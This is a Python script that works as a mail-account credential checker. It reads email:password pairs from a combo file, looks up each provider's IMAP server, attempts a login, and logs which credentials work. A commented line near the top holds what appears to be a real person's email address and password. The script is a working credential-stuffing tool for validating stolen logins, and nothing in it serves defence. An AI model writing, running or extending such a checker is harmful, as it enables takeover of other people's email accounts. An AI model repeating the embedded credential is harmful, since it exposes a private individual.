import email
import imaplib
import json
import time
import multiprocessing
import sys
import re
import os

# case 1 => connected || case 0 => not connected pass or user incorrect ||  case 2 =>  Format does not Valid

# email = 'gabriellainfo@alice.it:04031972'
# list_mails = [x.strip() for x in email.split(',')]  # to array


def opentest( email, password):
    match = re.search(
        r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9]+\.[a-zA-Z0-9.]*\.*$)", email)
    if match:
        try:
            isp_domain = email.split('@')[1]

            isp = init_ImapConfig(isp_domain)[1]
            print(isp)
            port = init_ImapConfig(isp_domain)[2]
            try:
                mail = imaplib.IMAP4_SSL(isp, port)
                print("try")
            except:
                print("except")
                mail = imaplib.IMAP4(isp, port)
                
                
            mail.login(email, password)
            result = {
                "completed": True,
                "data": {"email": email, "password": password},
                "msg": "pass successFull",
                "err": None,
                "case": 1
            }
        except Exception as e:

            result = {
                "completed": False,
                "data": {"email": email, "password": password},
                "msg": "Exeption",
                "err": str(e),
                "case": 0
            }
    else:

        result = {
            "completed": False,
            "data": {"email": email, "password": password},
            "msg": "Format does not Valid",
            "err": "email does not respect format",
            "case": 2
        }
    with open("result.txt",'a') as writer:
        l = email+'||'+password+'||'+str(result['case'])+'\n'
        writer.write(l)
    print(json.dumps(result))

def init_ImapConfig(hot):
    global ImapConfig
    ImapConfig = {}
    try:
        with open("hoster.dat", "r") as f:
            for line in f:
                hoster = line.strip().split(':')
                ImapConfig[hoster[0]] = (hoster[1], hoster[2])
                if hot == hoster[0] :
                    return hoster
    except Exception:
        print("[ERROR]hoster.dat", "not found!")

# def multiprocces(username, password):
#     opentest( username, password)
# for i in list_mails:
#     process = multiprocessing.Process(target=multiprocces, args=(i.split(':')[0], i.split(':')[1],))
#     process.start()





os.remove("result.txt")
with open("emailpass.txt") as reader:
    for l in reader:
        line     =  l.strip().split(':')
        # print(" user : ",user,"\n password : ",password)
        opentest(line[0] ,line[1] )
